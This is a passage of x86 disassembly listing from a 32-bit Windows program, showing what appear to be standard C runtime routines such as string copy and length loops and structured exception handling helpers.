  4036d6:	50                   	push   %eax
  4036d7:	51                   	push   %ecx
  4036d8:	41                   	inc    %ecx
  4036d9:	51                   	push   %ecx
  4036da:	e8 91 0e 00 00       	call   0x404570
  4036df:	8b 46 28             	mov    0x28(%esi),%eax
  4036e2:	83 c4 0c             	add    $0xc,%esp
  4036e5:	88 18                	mov    %bl,(%eax)
  4036e7:	8b c3                	mov    %ebx,%eax
  4036e9:	5b                   	pop    %ebx
  4036ea:	5e                   	pop    %esi
  4036eb:	c2 04 00             	ret    $0x4
  4036ee:	56                   	push   %esi
  4036ef:	8d 71 ec             	lea    -0x14(%ecx),%esi
  4036f2:	57                   	push   %edi
  4036f3:	8d 7e 14             	lea    0x14(%esi),%edi
  4036f6:	8b cf                	mov    %edi,%ecx
  4036f8:	e8 91 00 00 00       	call   0x40378e
  4036fd:	8b cf                	mov    %edi,%ecx
  4036ff:	e8 3c f8 ff ff       	call   0x402f40
  403704:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  403709:	74 07                	je     0x403712
  40370b:	56                   	push   %esi
  40370c:	e8 48 02 00 00       	call   0x403959
  403711:	59                   	pop    %ecx
  403712:	8b c6                	mov    %esi,%eax
  403714:	5f                   	pop    %edi
  403715:	5e                   	pop    %esi
  403716:	c2 04 00             	ret    $0x4
  403719:	b8 4d 82 40 00       	mov    $0x40824d,%eax
  40371e:	e8 15 06 00 00       	call   0x403d38
  403723:	51                   	push   %ecx
  403724:	51                   	push   %ecx
  403725:	53                   	push   %ebx
  403726:	56                   	push   %esi
  403727:	57                   	push   %edi
  403728:	33 db                	xor    %ebx,%ebx
  40372a:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40372d:	8b f1                	mov    %ecx,%esi
  40372f:	6a 01                	push   $0x1
  403731:	89 75 ec             	mov    %esi,-0x14(%ebp)
  403734:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403737:	5f                   	pop    %edi
  403738:	74 1b                	je     0x403755
  40373a:	8d 4e 14             	lea    0x14(%esi),%ecx
  40373d:	c7 06 14 92 40 00    	movl   $0x409214,(%esi)
  403743:	c7 46 0c 0c 92 40 00 	movl   $0x40920c,0xc(%esi)
  40374a:	e8 a3 f7 ff ff       	call   0x402ef2
  40374f:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403752:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403755:	53                   	push   %ebx
  403756:	8b ce                	mov    %esi,%ecx
  403758:	ff 75 08             	push   0x8(%ebp)
  40375b:	e8 1c fb ff ff       	call   0x40327c
  403760:	53                   	push   %ebx
  403761:	8d 4e 0c             	lea    0xc(%esi),%ecx
  403764:	ff 75 08             	push   0x8(%ebp)
  403767:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40376a:	e8 25 f9 ff ff       	call   0x403094
  40376f:	8b 06                	mov    (%esi),%eax
  403771:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403774:	5f                   	pop    %edi
  403775:	8b 40 04             	mov    0x4(%eax),%eax
  403778:	c7 04 30 08 92 40 00 	movl   $0x409208,(%eax,%esi,1)
  40377f:	8b c6                	mov    %esi,%eax
  403781:	5e                   	pop    %esi
  403782:	5b                   	pop    %ebx
  403783:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40378a:	c9                   	leave
  40378b:	c2 08 00             	ret    $0x8
  40378e:	b8 63 82 40 00       	mov    $0x408263,%eax
  403793:	e8 a0 05 00 00       	call   0x403d38
  403798:	51                   	push   %ecx
  403799:	8b 41 ec             	mov    -0x14(%ecx),%eax
  40379c:	56                   	push   %esi
  40379d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4037a0:	8b 40 04             	mov    0x4(%eax),%eax
  4037a3:	c7 44 08 ec 08 92 40 	movl   $0x409208,-0x14(%eax,%ecx,1)
  4037aa:	00 
  4037ab:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4037af:	8d 71 f8             	lea    -0x8(%ecx),%esi
  4037b2:	83 c1 ec             	add    $0xffffffec,%ecx
  4037b5:	f7 d9                	neg    %ecx
  4037b7:	1b c9                	sbb    %ecx,%ecx
  4037b9:	23 ce                	and    %esi,%ecx
  4037bb:	83 c1 08             	add    $0x8,%ecx
  4037be:	e8 36 f9 ff ff       	call   0x4030f9
  4037c3:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4037c7:	8b ce                	mov    %esi,%ecx
  4037c9:	e8 24 fb ff ff       	call   0x4032f2
  4037ce:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4037d1:	5e                   	pop    %esi
  4037d2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4037d9:	c9                   	leave
  4037da:	c3                   	ret
  4037db:	cc                   	int3
  4037dc:	cc                   	int3
  4037dd:	cc                   	int3
  4037de:	cc                   	int3
  4037df:	cc                   	int3
  4037e0:	57                   	push   %edi
  4037e1:	8b 7c 24 08          	mov    0x8(%esp),%edi
  4037e5:	eb 6a                	jmp    0x403851
  4037e7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4037ee:	8b ff                	mov    %edi,%edi
  4037f0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4037f4:	57                   	push   %edi
  4037f5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4037fb:	74 0f                	je     0x40380c
  4037fd:	8a 01                	mov    (%ecx),%al
  4037ff:	41                   	inc    %ecx
  403800:	84 c0                	test   %al,%al
  403802:	74 3b                	je     0x40383f
  403804:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40380a:	75 f1                	jne    0x4037fd
  40380c:	8b 01                	mov    (%ecx),%eax
  40380e:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  403813:	03 d0                	add    %eax,%edx
  403815:	83 f0 ff             	xor    $0xffffffff,%eax
  403818:	33 c2                	xor    %edx,%eax
  40381a:	83 c1 04             	add    $0x4,%ecx
  40381d:	a9 00 01 01 81       	test   $0x81010100,%eax
  403822:	74 e8                	je     0x40380c
  403824:	8b 41 fc             	mov    -0x4(%ecx),%eax
  403827:	84 c0                	test   %al,%al
  403829:	74 23                	je     0x40384e
  40382b:	84 e4                	test   %ah,%ah
  40382d:	74 1a                	je     0x403849
  40382f:	a9 00 00 ff 00       	test   $0xff0000,%eax
  403834:	74 0e                	je     0x403844
  403836:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40383b:	74 02                	je     0x40383f
  40383d:	eb cd                	jmp    0x40380c
  40383f:	8d 79 ff             	lea    -0x1(%ecx),%edi
  403842:	eb 0d                	jmp    0x403851
  403844:	8d 79 fe             	lea    -0x2(%ecx),%edi
  403847:	eb 08                	jmp    0x403851
  403849:	8d 79 fd             	lea    -0x3(%ecx),%edi
  40384c:	eb 03                	jmp    0x403851
  40384e:	8d 79 fc             	lea    -0x4(%ecx),%edi
  403851:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403855:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40385b:	74 19                	je     0x403876
  40385d:	8a 11                	mov    (%ecx),%dl
  40385f:	41                   	inc    %ecx
  403860:	84 d2                	test   %dl,%dl
  403862:	74 64                	je     0x4038c8
  403864:	88 17                	mov    %dl,(%edi)
  403866:	47                   	inc    %edi
  403867:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40386d:	75 ee                	jne    0x40385d
  40386f:	eb 05                	jmp    0x403876
  403871:	89 17                	mov    %edx,(%edi)
  403873:	83 c7 04             	add    $0x4,%edi
  403876:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  40387b:	8b 01                	mov    (%ecx),%eax
  40387d:	03 d0                	add    %eax,%edx
  40387f:	83 f0 ff             	xor    $0xffffffff,%eax
  403882:	33 c2                	xor    %edx,%eax
  403884:	8b 11                	mov    (%ecx),%edx
  403886:	83 c1 04             	add    $0x4,%ecx
  403889:	a9 00 01 01 81       	test   $0x81010100,%eax
  40388e:	74 e1                	je     0x403871
  403890:	84 d2                	test   %dl,%dl
  403892:	74 34                	je     0x4038c8
  403894:	84 f6                	test   %dh,%dh
  403896:	74 27                	je     0x4038bf
  403898:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  40389e:	74 12                	je     0x4038b2
  4038a0:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  4038a6:	74 02                	je     0x4038aa
  4038a8:	eb c7                	jmp    0x403871
  4038aa:	89 17                	mov    %edx,(%edi)
  4038ac:	8b 44 24 08          	mov    0x8(%esp),%eax
  4038b0:	5f                   	pop    %edi
  4038b1:	c3                   	ret
  4038b2:	66 89 17             	mov    %dx,(%edi)
  4038b5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4038b9:	c6 47 02 00          	movb   $0x0,0x2(%edi)
  4038bd:	5f                   	pop    %edi
  4038be:	c3                   	ret
  4038bf:	66 89 17             	mov    %dx,(%edi)
  4038c2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4038c6:	5f                   	pop    %edi
  4038c7:	c3                   	ret
  4038c8:	88 17                	mov    %dl,(%edi)
  4038ca:	8b 44 24 08          	mov    0x8(%esp),%eax
  4038ce:	5f                   	pop    %edi
  4038cf:	c3                   	ret
  4038d0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4038d4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4038da:	74 14                	je     0x4038f0
  4038dc:	8a 01                	mov    (%ecx),%al
  4038de:	41                   	inc    %ecx
  4038df:	84 c0                	test   %al,%al
  4038e1:	74 40                	je     0x403923
  4038e3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4038e9:	75 f1                	jne    0x4038dc
  4038eb:	05 00 00 00 00       	add    $0x0,%eax
  4038f0:	8b 01                	mov    (%ecx),%eax
  4038f2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4038f7:	03 d0                	add    %eax,%edx
  4038f9:	83 f0 ff             	xor    $0xffffffff,%eax
  4038fc:	33 c2                	xor    %edx,%eax
  4038fe:	83 c1 04             	add    $0x4,%ecx
  403901:	a9 00 01 01 81       	test   $0x81010100,%eax
  403906:	74 e8                	je     0x4038f0
  403908:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40390b:	84 c0                	test   %al,%al
  40390d:	74 32                	je     0x403941
  40390f:	84 e4                	test   %ah,%ah
  403911:	74 24                	je     0x403937
  403913:	a9 00 00 ff 00       	test   $0xff0000,%eax
  403918:	74 13                	je     0x40392d
  40391a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40391f:	74 02                	je     0x403923
  403921:	eb cd                	jmp    0x4038f0
  403923:	8d 41 ff             	lea    -0x1(%ecx),%eax
  403926:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40392a:	2b c1                	sub    %ecx,%eax
  40392c:	c3                   	ret
  40392d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  403930:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403934:	2b c1                	sub    %ecx,%eax
  403936:	c3                   	ret
  403937:	8d 41 fd             	lea    -0x3(%ecx),%eax
  40393a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40393e:	2b c1                	sub    %ecx,%eax
  403940:	c3                   	ret
  403941:	8d 41 fc             	lea    -0x4(%ecx),%eax
  403944:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403948:	2b c1                	sub    %ecx,%eax
  40394a:	c3                   	ret
  40394b:	6a 01                	push   $0x1
  40394d:	ff 74 24 08          	push   0x8(%esp)
  403951:	e8 c1 17 00 00       	call   0x405117
  403956:	59                   	pop    %ecx
  403957:	59                   	pop    %ecx
  403958:	c3                   	ret
  403959:	ff 74 24 04          	push   0x4(%esp)
  40395d:	e8 17 18 00 00       	call   0x405179
  403962:	59                   	pop    %ecx
  403963:	c3                   	ret
  403964:	55                   	push   %ebp
  403965:	8b ec                	mov    %esp,%ebp
  403967:	51                   	push   %ecx
  403968:	53                   	push   %ebx
  403969:	56                   	push   %esi
  40396a:	57                   	push   %edi
  40396b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40396e:	83 c0 0c             	add    $0xc,%eax
  403971:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403974:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  40397b:	8b 03                	mov    (%ebx),%eax
  40397d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403983:	8b 45 08             	mov    0x8(%ebp),%eax
  403986:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403989:	8b 63 fc             	mov    -0x4(%ebx),%esp
  40398c:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  40398f:	ff e0                	jmp    *%eax
  403991:	5f                   	pop    %edi
  403992:	5e                   	pop    %esi
  403993:	5b                   	pop    %ebx
  403994:	c9                   	leave
  403995:	c2 08 00             	ret    $0x8
  403998:	58                   	pop    %eax
  403999:	59                   	pop    %ecx
  40399a:	87 04 24             	xchg   %eax,(%esp)
  40399d:	ff e0                	jmp    *%eax
  40399f:	58                   	pop    %eax
  4039a0:	59                   	pop    %ecx
  4039a1:	87 04 24             	xchg   %eax,(%esp)
  4039a4:	ff e0                	jmp    *%eax
  4039a6:	55                   	push   %ebp
  4039a7:	8b ec                	mov    %esp,%ebp
  4039a9:	51                   	push   %ecx
  4039aa:	51                   	push   %ecx
  4039ab:	53                   	push   %ebx
  4039ac:	56                   	push   %esi
  4039ad:	57                   	push   %edi
  4039ae:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4039b4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4039b7:	c7 45 fc ce 39 40 00 	movl   $0x4039ce,-0x4(%ebp)
  4039be:	6a 00                	push   $0x0
  4039c0:	ff 75 0c             	push   0xc(%ebp)
  4039c3:	ff 75 fc             	push   -0x4(%ebp)
  4039c6:	ff 75 08             	push   0x8(%ebp)
  4039c9:	e8 32 45 00 00       	call   0x407f00
  4039ce:	8b 45 0c             	mov    0xc(%ebp),%eax
  4039d1:	8b 40 04             	mov    0x4(%eax),%eax
  4039d4:	24 fd                	and    $0xfd,%al
  4039d6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4039d9:	89 41 04             	mov    %eax,0x4(%ecx)
  4039dc:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4039e2:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4039e5:	89 03                	mov    %eax,(%ebx)
  4039e7:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  4039ee:	5f                   	pop    %edi
  4039ef:	5e                   	pop    %esi
  4039f0:	5b                   	pop    %ebx
  4039f1:	c9                   	leave
  4039f2:	c2 08 00             	ret    $0x8
  4039f5:	55                   	push   %ebp
  4039f6:	8b ec                	mov    %esp,%ebp
  4039f8:	83 ec 04             	sub    $0x4,%esp
  4039fb:	53                   	push   %ebx
  4039fc:	56                   	push   %esi
  4039fd:	57                   	push   %edi
  4039fe:	fc                   	cld
  4039ff:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a02:	33 c0                	xor    %eax,%eax
  403a04:	50                   	push   %eax
  403a05:	50                   	push   %eax
  403a06:	50                   	push   %eax
  403a07:	ff 75 fc             	push   -0x4(%ebp)
  403a0a:	ff 75 14             	push   0x14(%ebp)
  403a0d:	ff 75 10             	push   0x10(%ebp)
  403a10:	ff 75 0c             	push   0xc(%ebp)
  403a13:	ff 75 08             	push   0x8(%ebp)
  403a16:	e8 8d 17 00 00       	call   0x4051a8
  403a1b:	83 c4 20             	add    $0x20,%esp
  403a1e:	89 45 14             	mov    %eax,0x14(%ebp)
  403a21:	5f                   	pop    %edi
  403a22:	5e                   	pop    %esi
  403a23:	5b                   	pop    %ebx
  403a24:	8b 45 14             	mov    0x14(%ebp),%eax
  403a27:	8b e5                	mov    %ebp,%esp
  403a29:	5d                   	pop    %ebp
  403a2a:	c3                   	ret
  403a2b:	55                   	push   %ebp
  403a2c:	8b ec                	mov    %esp,%ebp
  403a2e:	83 ec 14             	sub    $0x14,%esp
  403a31:	8b 45 0c             	mov    0xc(%ebp),%eax
  403a34:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  403a38:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a3b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403a3e:	8b 45 14             	mov    0x14(%ebp),%eax
  403a41:	c7 45 f0 7f 3a 40 00 	movl   $0x403a7f,-0x10(%ebp)
  403a48:	40                   	inc    %eax
  403a49:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403a4c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a4f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403a55:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403a58:	8d 85 ec ff ff ff    	lea    -0x14(%ebp),%eax
  403a5e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403a64:	ff 75 18             	push   0x18(%ebp)
  403a67:	51                   	push   %ecx
  403a68:	ff 75 10             	push   0x10(%ebp)
  403a6b:	e8 40 1f 00 00       	call   0x4059b0
  403a70:	8b c8                	mov    %eax,%ecx
  403a72:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403a75:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403a7b:	8b c1                	mov    %ecx,%eax
  403a7d:	c9                   	leave
  403a7e:	c3                   	ret
  403a7f:	55                   	push   %ebp
  403a80:	8b ec                	mov    %esp,%ebp
  403a82:	fc                   	cld
  403a83:	8b 45 0c             	mov    0xc(%ebp),%eax
  403a86:	6a 00                	push   $0x0
  403a88:	50                   	push   %eax
  403a89:	ff 70 10             	push   0x10(%eax)
  403a8c:	ff 70 08             	push   0x8(%eax)
  403a8f:	6a 00                	push   $0x0
  403a91:	ff 75 10             	push   0x10(%ebp)
  403a94:	ff 70 0c             	push   0xc(%eax)
  403a97:	ff 75 08             	push   0x8(%ebp)
  403a9a:	e8 09 17 00 00       	call   0x4051a8
  403a9f:	83 c4 20             	add    $0x20,%esp
  403aa2:	5d                   	pop    %ebp
  403aa3:	c3                   	ret
  403aa4:	55                   	push   %ebp
  403aa5:	8b ec                	mov    %esp,%ebp
  403aa7:	83 ec 34             	sub    $0x34,%esp
  403aaa:	53                   	push   %ebx
  403aab:	56                   	push   %esi
  403aac:	57                   	push   %edi
  403aad:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  403ab1:	c7 45 dc 58 3b 40 00 	movl   $0x403b58,-0x24(%ebp)
  403ab8:	8b 45 18             	mov    0x18(%ebp),%eax
  403abb:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403abe:	8b 45 0c             	mov    0xc(%ebp),%eax
  403ac1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403ac4:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403ac7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403aca:	8b 45 20             	mov    0x20(%ebp),%eax
  403acd:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403ad0:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  403ad4:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  403ad8:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403adc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403ae0:	c7 45 f0 2a 3b 40 00 	movl   $0x403b2a,-0x10(%ebp)
  403ae7:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403aea:	89 6d f8             	mov    %ebp,-0x8(%ebp)
  403aed:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403af3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403af6:	8d 85 d8 ff ff ff    	lea    -0x28(%ebp),%eax
  403afc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403b02:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  403b09:	8b 45 08             	mov    0x8(%ebp),%eax
  403b0c:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403b0f:	8b 45 10             	mov    0x10(%ebp),%eax
  403b12:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403b15:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403b18:	50                   	push   %eax
  403b19:	8b 45 08             	mov    0x8(%ebp),%eax
  403b1c:	ff 30                	push   (%eax)
  403b1e:	ff 15 e4 bf 40 00    	call   *0x40bfe4
  403b24:	59                   	pop    %ecx
  403b25:	59                   	pop    %ecx
  403b26:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  403b2a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  403b2e:	74 17                	je     0x403b47
  403b30:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  403b37:	8b 03                	mov    (%ebx),%eax
  403b39:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  403b3c:	89 03                	mov    %eax,(%ebx)
  403b3e:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  403b45:	eb 09                	jmp    0x403b50
  403b47:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403b4a:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403b50:	8b 45 cc             	mov    -0x34(%ebp),%eax
  403b53:	5f                   	pop    %edi
  403b54:	5e                   	pop    %esi
  403b55:	5b                   	pop    %ebx
  403b56:	c9                   	leave
  403b57:	c3                   	ret
  403b58:	55                   	push   %ebp
  403b59:	8b ec                	mov    %esp,%ebp
  403b5b:	53                   	push   %ebx
  403b5c:	56                   	push   %esi
  403b5d:	57                   	push   %edi
  403b5e:	fc                   	cld
  403b5f:	8b 45 08             	mov    0x8(%ebp),%eax
  403b62:	8b 40 04             	mov    0x4(%eax),%eax
  403b65:	83 e0 66             	and    $0x66,%eax
  403b68:	85 c0                	test   %eax,%eax
  403b6a:	74 0f                	je     0x403b7b
  403b6c:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b6f:	c7 40 24 01 00 00 00 	movl   $0x1,0x24(%eax)
  403b76:	6a 01                	push   $0x1
  403b78:	58                   	pop    %eax
  403b79:	eb 4d                	jmp    0x403bc8
  403b7b:	6a 01                	push   $0x1
  403b7d:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b80:	ff 70 14             	push   0x14(%eax)
  403b83:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b86:	ff 70 10             	push   0x10(%eax)
  403b89:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b8c:	ff 70 08             	push   0x8(%eax)
  403b8f:	6a 00                	push   $0x0
  403b91:	ff 75 10             	push   0x10(%ebp)
  403b94:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b97:	ff 70 0c             	push   0xc(%eax)
  403b9a:	ff 75 08             	push   0x8(%ebp)
  403b9d:	e8 06 16 00 00       	call   0x4051a8
  403ba2:	83 c4 20             	add    $0x20,%esp
  403ba5:	8b 45 0c             	mov    0xc(%ebp),%eax
  403ba8:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  403bac:	75 0b                	jne    0x403bb9
  403bae:	ff 75 08             	push   0x8(%ebp)
  403bb1:	ff 75 0c             	push   0xc(%ebp)
  403bb4:	e8 ed fd ff ff       	call   0x4039a6
  403bb9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403bbc:	8b 63 1c             	mov    0x1c(%ebx),%esp
  403bbf:	8b 6b 20             	mov    0x20(%ebx),%ebp
  403bc2:	ff 63 18             	jmp    *0x18(%ebx)
  403bc5:	6a 01                	push   $0x1
  403bc7:	58                   	pop    %eax
  403bc8:	5f                   	pop    %edi
  403bc9:	5e                   	pop    %esi
  403bca:	5b                   	pop    %ebx
  403bcb:	5d                   	pop    %ebp
  403bcc:	c3                   	ret
  403bcd:	55                   	push   %ebp
  403bce:	8b ec                	mov    %esp,%ebp
  403bd0:	51                   	push   %ecx
  403bd1:	53                   	push   %ebx
  403bd2:	56                   	push   %esi
  403bd3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403bd7:	57                   	push   %edi
  403bd8:	8b 7d 08             	mov    0x8(%ebp),%edi
  403bdb:	8b 77 0c             	mov    0xc(%edi),%esi
  403bde:	8b 5f 10             	mov    0x10(%edi),%ebx
  403be1:	8b c6                	mov    %esi,%eax
  403be3:	89 75 08             	mov    %esi,0x8(%ebp)
  403be6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403be9:	7c 39                	jl     0x403c24
  403beb:	83 fe ff             	cmp    $0xffffffff,%esi
  403bee:	75 05                	jne    0x403bf5
  403bf0:	e8 5d 1e 00 00       	call   0x405a52
  403bf5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403bf8:	4e                   	dec    %esi
  403bf9:	8d 04 b6             	lea    (%esi,%esi,4),%eax
  403bfc:	39 4c 83 04          	cmp    %ecx,0x4(%ebx,%eax,4)
  403c00:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  403c03:	7d 05                	jge    0x403c0a
  403c05:	3b 48 08             	cmp    0x8(%eax),%ecx
  403c08:	7e 05                	jle    0x403c0f
  403c0a:	83 fe ff             	cmp    $0xffffffff,%esi
  403c0d:	75 0c                	jne    0x403c1b
  403c0f:	8b 45 08             	mov    0x8(%ebp),%eax
  403c12:	ff 4d 0c             	decl   0xc(%ebp)
  403c15:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403c18:	89 75 08             	mov    %esi,0x8(%ebp)
  403c1b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403c1f:	7d ca                	jge    0x403beb
  403c21:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c24:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403c27:	46                   	inc    %esi
  403c28:	89 31                	mov    %esi,(%ecx)
  403c2a:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403c2d:	89 01                	mov    %eax,(%ecx)
  403c2f:	3b 47 0c             	cmp    0xc(%edi),%eax
  403c32:	77 04                	ja     0x403c38
  403c34:	3b f0                	cmp    %eax,%esi
  403c36:	76 05                	jbe    0x403c3d
  403c38:	e8 15 1e 00 00       	call   0x405a52
  403c3d:	8d 04 b6             	lea    (%esi,%esi,4),%eax
  403c40:	5f                   	pop    %edi
  403c41:	5e                   	pop    %esi
  403c42:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  403c45:	5b                   	pop    %ebx
  403c46:	c9                   	leave
  403c47:	c3                   	ret
  403c48:	55                   	push   %ebp
  403c49:	8b ec                	mov    %esp,%ebp
  403c4b:	53                   	push   %ebx
  403c4c:	56                   	push   %esi
  403c4d:	57                   	push   %edi
  403c4e:	55                   	push   %ebp
  403c4f:	6a 00                	push   $0x0
  403c51:	6a 00                	push   $0x0
  403c53:	68 60 3c 40 00       	push   $0x403c60
  403c58:	ff 75 08             	push   0x8(%ebp)
  403c5b:	e8 a0 42 00 00       	call   0x407f00
  403c60:	5d                   	pop    %ebp
  403c61:	5f                   	pop    %edi
  403c62:	5e                   	pop    %esi
  403c63:	5b                   	pop    %ebx
  403c64:	8b e5                	mov    %ebp,%esp
  403c66:	5d                   	pop    %ebp
  403c67:	c3                   	ret
  403c68:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c6c:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  403c73:	b8 01 00 00 00       	mov    $0x1,%eax
  403c78:	74 0f                	je     0x403c89
  403c7a:	8b 44 24 08          	mov    0x8(%esp),%eax
  403c7e:	8b 54 24 10          	mov    0x10(%esp),%edx
  403c82:	89 02                	mov    %eax,(%edx)
  403c84:	b8 03 00 00 00       	mov    $0x3,%eax
  403c89:	c3                   	ret
  403c8a:	53                   	push   %ebx
  403c8b:	56                   	push   %esi
  403c8c:	57                   	push   %edi
  403c8d:	8b 44 24 10          	mov    0x10(%esp),%eax
  403c91:	50                   	push   %eax
  403c92:	6a fe                	push   $0xfffffffe
  403c94:	68 68 3c 40 00       	push   $0x403c68
  403c99:	64 ff 35 00 00 00 00 	push   %fs:0x0
  403ca0:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403ca7:	8b 44 24 20          	mov    0x20(%esp),%eax
  403cab:	8b 58 08             	mov    0x8(%eax),%ebx
  403cae:	8b 70 0c             	mov    0xc(%eax),%esi
  403cb1:	83 fe ff             	cmp    $0xffffffff,%esi
  403cb4:	74 2e                	je     0x403ce4
  403cb6:	3b 74 24 24          	cmp    0x24(%esp),%esi
  403cba:	74 28                	je     0x403ce4
  403cbc:	8d 34 76             	lea    (%esi,%esi,2),%esi
  403cbf:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  403cc2:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  403cc6:	89 48 0c             	mov    %ecx,0xc(%eax)
  403cc9:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  403cce:	75 12                	jne    0x403ce2
  403cd0:	68 01 01 00 00       	push   $0x101
  403cd5:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  403cd9:	e8 40 00 00 00       	call   0x403d1e
  403cde:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  403ce2:	eb c3                	jmp    0x403ca7
  403ce4:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  403ceb:	83 c4 0c             	add    $0xc,%esp
  403cee:	5f                   	pop    %edi
  403cef:	5e                   	pop    %esi
  403cf0:	5b                   	pop    %ebx
  403cf1:	c3                   	ret
  403cf2:	33 c0                	xor    %eax,%eax
  403cf4:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  403cfb:	81 79 04 68 3c 40 00 	cmpl   $0x403c68,0x4(%ecx)
  403d02:	75 10                	jne    0x403d14
  403d04:	8b 51 0c             	mov    0xc(%ecx),%edx
  403d07:	8b 52 0c             	mov    0xc(%edx),%edx
  403d0a:	39 51 08             	cmp    %edx,0x8(%ecx)
